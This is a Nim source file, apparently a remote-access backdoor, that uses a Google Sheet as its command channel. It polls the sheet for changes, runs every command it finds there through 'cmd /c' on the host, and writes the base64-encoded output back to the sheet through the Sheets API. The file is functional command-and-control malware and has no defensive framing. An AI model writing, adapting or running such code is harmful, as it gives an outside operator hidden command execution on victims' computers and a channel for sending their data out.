import times, strutils, std/os, std/httpclient, std/base64, std/json, std/osproc
import getAccessToken

let clientID = parseJson(readfile("C:/Users/user/Desktop/nim-malware/client/clientID"))["web"]

let DOCID = "1fBZ9-BB09fuIIFY2coe68B-QWZaDGr8El2ISEdr28M0"

proc lastUpdated(DOCID: string): DateTime =
    # refresh token
    var DRIVE_ACCESS_TOKEN = getAccessToken(clientID[
            "drive_refresh_token"].getStr())
    # get doc from drive
    let client = newHttpClient()
    client.headers = newHttpHeaders({"Authorization": "Bearer " &
            DRIVE_ACCESS_TOKEN, "Accept": "application/json"})
    var resDoc2: JsonNode
    try:
        var res = client.getContent("https://www.googleapis.com/drive/v3/files/" &
                DOCID & "/revisions")
        resDoc2 = parseJson(res)
    finally:
        client.close()
    # echo resDoc2
    var dtString = resDoc2["revisions"][^1]["modifiedTime"].getStr()
    var parts = dtString.split('.')
    let dtFormat = "yyyy-MM-dd'T'HH:mm:ss'Z'"
    return parse(parts[0] & 'Z', dtFormat)

var oldTime = lastUpdated(DOCID)
echo "initialing sheet"
# exec command and update value
# refresh token
var ACCESS_TOKEN = getAccessToken(clientID["refresh_token"].getStr())
# get doc
let client = newHttpClient()
client.headers = newHttpHeaders({"Authorization": "Bearer " &
        ACCESS_TOKEN, "Accept": "application/json"})
var resDoc2: JsonNode
try:
    var resDoc = client.getContent("https://sheets.googleapis.com/v4/spreadsheets/" & DOCID & "?fields=sheets.data.rowData.values(formattedValue)&ranges=Sheet1")
    resDoc2 = parseJson(resDoc)
finally:
    client.close()

var resContent = (resDoc2["sheets"][0]["data"][0]["rowData"][0]["values"]).getElems()
# put results of the commands
for i in 0..(resContent.len - 1):
    # echo resContent[i]
    var execVar: string
    try:
        execVar = execProcess("cmd /c " & resContent[i]["formattedValue"].getStr())
    except:
        break

    let putclient = newHttpClient()
    putclient.headers = newHttpHeaders({"Authorization": "Bearer " &
            ACCESS_TOKEN, "Accept": "application/json",
            "Content-Type": "application/json"})
    var finalURL = "https://sheets.googleapis.com/v4/spreadsheets/" &
            DOCID & "/values/Y" & intToStr(i+1) & "?valueInputOption=USER_ENTERED"
    var finalbody = """{"values":[["""" & encode(execVar) & """"]]}"""
    try:
        var rescomn = putclient.putContent(finalURL, body = finalbody)
    finally:
        putclient.close()

# var dt : DateTime
while true:
    # get dateModified
    var dt = lastUpdated(DOCID)

    # check if its changed
    if oldTime < dt: # its changed
        echo "new commands recieved, updating results"
    # exec command and update value
        # refresh token
        var ACCESS_TOKEN = getAccessToken(clientID["refresh_token"].getStr())
        # get doc
        let client = newHttpClient()
        client.headers = newHttpHeaders({"Authorization": "Bearer " &
                ACCESS_TOKEN, "Accept": "application/json"})
        var resDoc2: JsonNode
        try:
            var resDoc = client.getContent(
                    "https://sheets.googleapis.com/v4/spreadsheets/" & DOCID & "?fields=sheets.data.rowData.values(formattedValue)&ranges=Sheet1")
            resDoc2 = parseJson(resDoc)
        finally:
            client.close()

        var resContent = (resDoc2["sheets"][0]["data"][0]["rowData"][0][
                "values"]).getElems()
        # put results of the commands
        for i in 0..(resContent.len - 1):
            var execVar: string
            try:
                execVar = execProcess("cmd /c " & resContent[i]["formattedValue"].getStr())
            except:
                break
            let putclient = newHttpClient()
            putclient.headers = newHttpHeaders({"Authorization": "Bearer " &
                    ACCESS_TOKEN, "Accept": "application/json",
                    "Content-Type": "application/json"})
            var finalURL = "https://sheets.googleapis.com/v4/spreadsheets/" &
                    DOCID & "/values/Y" & intToStr(i+1) & "?valueInputOption=USER_ENTERED"
            var finalbody = """{"values":[["""" & encode(execVar) & """"]]}"""
            try:
                var rescomn = putclient.putContent(finalURL, body = finalbody)
            finally:
                putclient.close()

        # update oldTime
        oldTime = lastUpdated(DOCID)
    else:
        # sleep for 5 sec
        echo oldTime
        echo dt

        sleep(5000)
